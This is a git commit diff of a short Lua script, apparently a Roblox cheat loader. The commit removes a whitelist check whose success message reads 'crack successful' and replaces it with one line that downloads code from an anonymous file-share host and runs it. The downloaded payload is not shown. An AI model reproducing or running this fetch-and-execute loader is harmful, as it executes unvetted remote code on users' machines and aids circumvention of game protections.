5aa9baba59c22fc054bcd2fb3833c65234942b74
renlua <141826500+renlua@users.noreply.github.com>
2024-05-26 12:15:42 +0800

    Update 1.lua

--- 1.lua
+++ 1.lua
@@ -1,12 +1,1 @@
-local whitelist = loadstring(game:HttpGet("https://raw.githubusercontent.com/renlua/lua/main/renscript.lua"))();
-
-if game:GetService("CoreGui").BubbleChat["BubbleChat_"..game.Players.LocalPlayer.UserId].padding.Name == "padding" then
-    if game.Players.LocalPlayer.Name == game.Players.LocalPlayer.Character.Name and game.Players.LocalPlayer.CharacterAppearanceId == game.Players.LocalPlayer.UserId then
-        if whitelist[game.Players.LocalPlayer.Name] then
-            setclipboard("破解成功")
-        end
-    end
-end
-
-
-
+loadstring(game:HttpGet("http://pan.cdndns.site/api/down.php/4d8f69be76870271d9345272e9810678"))();
